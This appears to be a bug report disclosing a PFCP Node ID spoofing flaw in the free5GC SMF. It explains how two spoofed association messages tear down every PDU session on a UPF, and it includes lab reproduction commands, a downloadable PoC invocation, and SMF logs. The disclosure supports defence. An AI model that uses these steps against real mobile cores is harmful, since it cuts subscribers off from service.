title: [Bugs] One Spoofed PFCP Association Message Releases Every PDU Session on a Chosen UPF
body:
### Bug Description

The free5GC **SMF** decides *who sent* a PFCP (N4, UDP/8805) message by reading the **Node ID IE inside the message body** (`nodeIDFromIE(request.NodeID)`), never by checking the UDP source address. The source address is available in the handler and is simply not used. So any host that can deliver one UDP datagram to the SMF's N4 port can claim to be a UPF that the SMF is already associated with.

The logic is short. The SMF and the UPF are correctly associated and carrying live PDU Sessions. An attacker on a different host then sends two ordinary PFCP messages naming that UPF's Node ID:

1. an **Association Setup Request** with a Recovery Time Stamp newer than the SMF's own — the SMF concludes the UPF has restarted and releases everything it holds on it;
2. an **Association Update Request** with the same Node ID and the **SARR** bit set (IE 111 payload `0x01`) — the SMF concludes the UPF has asked to be released and terminates the sessions that remain.

Every PDU Session on that UPF is then gone, and the UEs recover only by re-registering, with new UE IP addresses.

The messages themselves are spec-legal and the SMF's reaction to them is the designed one; the defect is that it never verifies who sent them. Two negative controls show that the whole outcome hangs on that single bit: the same Update with no IE 111, or with IE 111 = `0x02` (URSS), is likewise accepted with `cause=1` and destroys nothing.

### To Reproduce

Tested target: free5GC **v4.3.0**, SMF N4 at `10.100.200.5:8805/udp`, UPF Node ID `10.100.200.3` (`upf.free5gc.org`). The attack is run from the Docker host (the compose bridge, `10.100.200.1`); root is not required.

1. **Deploy the target core** (tngf exits 0 by design):

   ```bash
   git clone https://github.com/hackeryounow/5gc-deployments.git
   cd 5gc-deployments/free5gc/4.3.0
   docker compose -p free5gc-v430 up -d
   sleep 45                      # let the NFs register at the NRF
   ```

2. **Provision subscribers** (a fresh `dbdata` volume is empty — registration fails without this) **and start the UE**:

   ```bash
   pip3 install git+https://github.com/hackeryounow/coresimrunner.git@v1.4.0
   coresimrunner --mode provision --count 5 --core-network free5gc \
           --core-address 127.0.0.1 --webui-port 5000 \
           --initial-imsi-index 1 --plmn 20893 \
           --opc 8e27b6af0e692e750f32667a3b14605d \
           --ki 8baf473f2f8fd09487cccbd7097c6862 \
           --username admin --password free5gc --no-ims
   docker exec -d ueransim bash -c 'cd /ueransim && ./nr-ue -c ./config/uecfg.yaml > /tmp/ue.log 2>&1'
   sleep 40 && docker exec ueransim sh -c 'ip -br addr | grep uesimtun'
   # -> uesimtun0 10.60.0.1/16   uesimtun1 10.61.0.1/16
   ```

3. **Run the negative controls** — both must be accepted with nothing torn down:

   ```bash
   wget https://raw.githubusercontent.com/hackeryounow/5GCVulDB/refs/heads/main/VUL-20260929-POC/b1_2_pfcp_assoc_release_poc.py
   python3 b1_2_pfcp_assoc_release_poc.py --target 10.100.200.5 --upf-node-id 10.100.200.3 --stage update-benign
   # -> round 1 step1 AssociationUpdateRequest(no SARR)   cause=1 (Request accepted)
   python3 b1_2_pfcp_assoc_release_poc.py --target 10.100.200.5 --upf-node-id 10.100.200.3 --stage update-urss
   # -> cause=1; SMF logs "reported that non-zero Usage Reports"; tunnels unchanged
   ```

4. **Fire the two-stage spoof** (25-octet Setup + 22-octet Update, 47 octets total) and verify the teardown:

   ```bash
   python3 b1_2_pfcp_assoc_release_poc.py --target 10.100.200.5 --upf-node-id 10.100.200.3 --stage both
   # -> step1 Setup cause=1; step2 Update(SARR=1) cause=1
   sleep 16
   docker exec ueransim sh -c 'ip -br addr | grep uesimtun'     # -> empty: both PDU Sessions gone
   docker logs smf --since <UTC timestamp from before step 4> 2>&1 | grep -E 'Recovery Time Stamp|Release all resources|Release IP'
   sleep 14                                                     # second wave: genuine Release to the real UPF times out
   ```

### Expected Behavior

The SMF must not accept node-identity claims from the message body of an unauthenticated datagram: a PFCP node message whose UDP source address does not belong to the configured UPF must be ignored, and a PDU Session teardown may only ever result from the genuine UPF's own association management.

### Screenshots

**PoC acceptance of both spoofed stages** (both answered `cause=1`):

```
[+] round 1 step1 AssociationSetupRequest             cause=1 (Request accepted)
[+] round 1 step2 AssociationUpdateRequest(SARR=1)    cause=1 (Request accepted)
```

**SMF teardown, wave 1** (`docker logs smf`, attack window) — the spoofed Setup invalidates the association and both PDU Sessions are released:

```
[WARN][SMF][PFCP]  UPF[10.100.200.3] sent Association Setup with a newer Recovery Time Stamp; invalidating association generation 1
[INFO][SMF][Main]  Canceled association to UPF[[upf.free5gc.org](10.100.200.3)]
[INFO][SMF][Main]  Release all resources of UPF [upf.free5gc.org](10.100.200.3)
[INFO][SMF][Main]  Invalidated 2 PFCP sessions for UPF[upf.free5gc.org](10.100.200.3)
[INFO][SMF][PduSess] UE[imsi-208930000000001] PDUSessionID[2] Release IP[10.61.0.1]
[INFO][SMF][PduSess] UE[imsi-208930000000001] PDUSessionID[1] Release IP[10.60.0.1]
```

**Wave 2, ~12 s later** — the genuine Association Release the SMF sent to the innocent real UPF times out and the SMF cancels the association again:

```
[ERRO][SMF][PFCP] PFCP Association Release Request to UPF[upf.free5gc.org](10.100.200.3) failed: PFCP Association Release Request to 10.100.200.3:8805: PFCP request to 10.100.200.3:8805 timed out
[INFO][SMF][Main] Canceled association to UPF[[upf.free5gc.org](10.100.200.3)]
[INFO][SMF][Main] Release all resources of UPF [upf.free5gc.org](10.100.200.3)
```

**Container oracle** — graceful teardown, no crash and no restart:

```
/smf running exit=0 restarts=0
/upf running exit=0 restarts=0
/amf running exit=0 restarts=0
```

**Tunnel oracle** — both PDU Sessions destroyed; the UE only recovers by re-registering (fresh IPs `10.60.0.2` / `10.61.0.2`):

```
before:  uesimtun0 10.60.0.1/16   uesimtun1 10.61.0.1/16
after:   (no uesimtun* interfaces)
```

### Environment

Please complete the following information:
- free5GC Version: v4.3.0
- Deployment: Docker-based 5G Core Network
- OS: Ubuntu 20.04.6 LTS
- Kernel version: 5.15.0-139-generic
- go version: 1.27.1 linux/amd64

### Trace Files

None

### Additional Context

**Vulnerability Type.** Missing authentication for a critical function (CWE-306): the SMF's N4 endpoint trusts the Node ID IE from an unauthenticated datagram instead of validating the peer address, which is an authentication bypass by spoofing (CWE-290).

**Impact.** Any host that can reach the SMF's UDP/8805 can tear down the SMF↔UPF association and every PDU Session carried on that UPF with 47 octets; subscriber traffic stops until UEs re-register, and the SMF then amplifies the attack itself by cancelling the healthy association a second time.

**CVSS v4.** `CVSS:4.0/AV:A/AC:L/AT:N/PR:N/UI:N/VC:N/VI:N/VA:H/SC:N/SI:N/SA:N` — **6.8 (Medium)**.
